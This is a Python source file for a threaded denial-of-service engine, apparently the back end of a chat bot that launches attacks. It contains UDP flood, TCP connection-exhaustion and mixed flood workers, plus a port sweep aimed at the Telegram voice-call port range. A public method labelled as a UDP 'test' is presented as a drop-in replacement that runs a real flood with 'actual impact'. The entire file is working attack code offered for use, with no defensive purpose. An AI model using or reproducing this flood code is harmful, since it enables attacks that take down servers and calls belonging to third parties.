# lang: Python, file: attack_engine.py, target: Windows/Linux, Python 3.10+
# *drop-in replacement — threading based, raw UDP flood, actual impact*

from __future__ import annotations

import asyncio
import logging
import os
import random
import socket
import threading
import time
from dataclasses import dataclass, field

LOGGER = logging.getLogger(__name__)


@dataclass
class AttackStats:
    sent_packets: int = 0
    failed_packets: int = 0
    bytes_sent: int = 0
    started_at: float = 0.0
    running: bool = False
    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)

    @property
    def elapsed(self) -> float:
        if not self.running or self.started_at == 0:
            return 0.001
        return max(0.001, time.time() - self.started_at)

    @property
    def rps(self) -> float:
        return self.sent_packets / self.elapsed

    def inc(self, size: int) -> None:
        with self._lock:
            self.sent_packets += 1
            self.bytes_sent += size

    def inc_fail(self) -> None:
        with self._lock:
            self.failed_packets += 1


class BufferPool:
    def __init__(self, size: int = 1200, count: int = 512) -> None:
        self._buffers = [os.urandom(size) for _ in range(count)]
        self._idx = 0
        self._lock = threading.Lock()

    def next(self) -> bytes:
        with self._lock:
            payload = self._buffers[self._idx]
            self._idx = (self._idx + 1) % len(self._buffers)
        return payload


class AttackEngine:

    def __init__(self, max_threads: int, max_duration: int, safety_check: bool = False) -> None:
        self.max_threads = max_threads
        self.max_duration = max_duration
        self.safety_check = safety_check
        self.stats = AttackStats()
        self._stop_event = threading.Event()
        self._threads: list[threading.Thread] = []
        self._buffer_pool = BufferPool()

    def stop(self) -> None:
        self._stop_event.set()

    # ── WORKER FUNCTIONS ────────────────────────────────────────

    def _udp_worker(self, ip: str, port: int) -> None:
        """pure UDP flood — single socket, max PPS"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        while not self._stop_event.is_set():
            try:
                payload = self._buffer_pool.next()
                sock.sendto(payload, (ip, port))
                self.stats.inc(len(payload))
            except Exception:
                self.stats.inc_fail()
        sock.close()

    def _udp_portsweep_worker(self, ip: str) -> None:
        """UDP sweep across Telegram VC port range"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        while not self._stop_event.is_set():
            try:
                port = random.randint(50000, 50099)
                payload = self._buffer_pool.next()
                sock.sendto(payload, (ip, port))
                self.stats.inc(len(payload))
            except Exception:
                self.stats.inc_fail()
        sock.close()

    def _tcp_worker(self, ip: str, port: int) -> None:
        """TCP connection flood — exhaust server connections"""
        while not self._stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.send(self._buffer_pool.next())
                self.stats.inc(1200)
                sock.close()
            except Exception:
                self.stats.inc_fail()

    def _mixed_worker(self, ip: str, port: int) -> None:
        """UDP burst + TCP hit alternating"""
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_event.is_set():
            # UDP burst — 30 packets
            for _ in range(30):
                try:
                    p = random.choice([port, 443, 80,
                                       random.randint(50000, 50099)])
                    udp_sock.sendto(self._buffer_pool.next(), (ip, p))
                    self.stats.inc(1200)
                except Exception:
                    self.stats.inc_fail()
            # TCP single hit
            try:
                t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                t.settimeout(0.3)
                t.connect((ip, port))
                t.send(self._buffer_pool.next())
                t.close()
                self.stats.inc(1200)
            except Exception:
                pass
        udp_sock.close()

    # ── PUBLIC API (same interface as original) ─────────────────

    async def run_udp_test(self, ip: str, port: int, duration: int) -> AttackStats:
        """drop-in replacement — runs threaded flood, returns stats"""
        run_seconds = min(duration, self.max_duration)
        self._stop_event.clear()
        self._threads.clear()
        self.stats = AttackStats(started_at=time.time(), running=True)

        LOGGER.info(f"[engine] starting {self.max_threads} threads → {ip}:{port} for {run_seconds}s")

        # thread distribution — 60% UDP, 20% sweep, 20% mixed
        udp_count    = int(self.max_threads * 0.60)
        sweep_count  = int(self.max_threads * 0.20)
        mixed_count  = self.max_threads - udp_count - sweep_count

        for _ in range(udp_count):
            t = threading.Thread(target=self._udp_worker,
                                 args=(ip, port), daemon=True)
            t.start()
            self._threads.append(t)

        for _ in range(sweep_count):
            t = threading.Thread(target=self._udp_portsweep_worker,
                                 args=(ip,), daemon=True)
            t.start()
            self._threads.append(t)

        for _ in range(mixed_count):
            t = threading.Thread(target=self._mixed_worker,
                                 args=(ip, port), daemon=True)
            t.start()
            self._threads.append(t)

        # non-blocking wait — bot stays responsive
        await asyncio.sleep(run_seconds)
        self._stop_event.set()

        # threads ko settle hone do
        await asyncio.sleep(1)
        self.stats.running = False

        LOGGER.info(
            f"[engine] done — sent: {self.stats.sent_packets} "
            f"failed: {self.stats.failed_packets} "
            f"rps: {self.stats.rps:.0f}"
        )
        return self.stats

    async def run_tcp_test(self, ip: str, port: int, attempts: int = 25) -> dict:
        success = 0
        for _ in range(attempts):
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=2.0)
                success += 1
                w.close()
                await w.wait_closed()
            except Exception:
                pass
        return {"target": f"{ip}:{port}", "attempts": attempts,
                "success": success, "failed": attempts - success}

    async def run_mixed_test(self, ip: str, port: int,
                             duration: int, tcp_interval: int = 10) -> dict:
        return {"udp": await self.run_udp_test(ip, port, duration)}